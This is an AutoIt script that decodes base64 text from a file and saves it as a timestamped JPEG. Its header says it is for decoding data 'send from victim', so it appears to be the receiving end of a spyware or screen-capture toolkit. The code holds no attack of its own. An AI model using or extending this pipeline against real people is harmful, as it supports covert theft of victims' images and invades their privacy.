;~ /*
;~ /* File: DecodeImg.au3
;~ /* Author: TiDz
;~ /* Contact: nguyentinvs123@gmail.com
;~  * Created on Thu Apr 25 2025
;~  *
;~  * Description: 
;~  *
;~  * The MIT License (MIT)
;~  * Copyright (c) 2025 TiDz
;~  *
;~  * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
;~  * and associated documentation files (the "Software"), to deal in the Software without restriction,
;~  * including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
;~  * and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
;~  * subject to the following conditions: unconditional.
;~  *
;~  * Useage: Decode base64 code send from victim to img (.jpg)
;~  */


#include <FileConstants.au3>

Local $input = @ScriptDir & "\input.txt"

Local $outFolder = @ScriptDir & "\img\"
If Not FileExists($outFolder) Then
    DirCreate($outFolder)
EndIf

Local $fileInput = FileOpen($input, 0)
If $fileInput = -1 Then
	ConsoleWrite("asdasD")
	Exit
EndIf

Local $count = 0
Local $finalLine = ""
While 1
    Local $line = FileReadLine($fileInput)
    If @error Then ExitLoop
    
;~     $line = StringStripWS($line, $STR_STRIPALL)
    
    If $line = "" Then ContinueLoop
    $count += 1
    $finalLine &= $line
WEnd
Local $name = "Image_" & @YEAR & @MON & @MDAY & "_" & $count & "_" & @HOUR & @MIN & @SEC & ".jpg"
Local $outFinal = $outFolder & $name

Local $xml = ObjCreate("Msxml2.DOMDocument.3.0")
If Not IsObj($xml) Then
	Exit
EndIf
Local $node = $xml.createElement("base64")
$node.dataType = "bin.base64"
$node.text = $finalLine
Local $bin = $node.nodeTypedValue
Local $outEnd = FileOpen($outFinal, 18)
If $outEnd = -1 Then
	Exit
EndIf
FileWrite($outEnd, $bin)
FileClose($outEnd)
FileClose($outEnd)


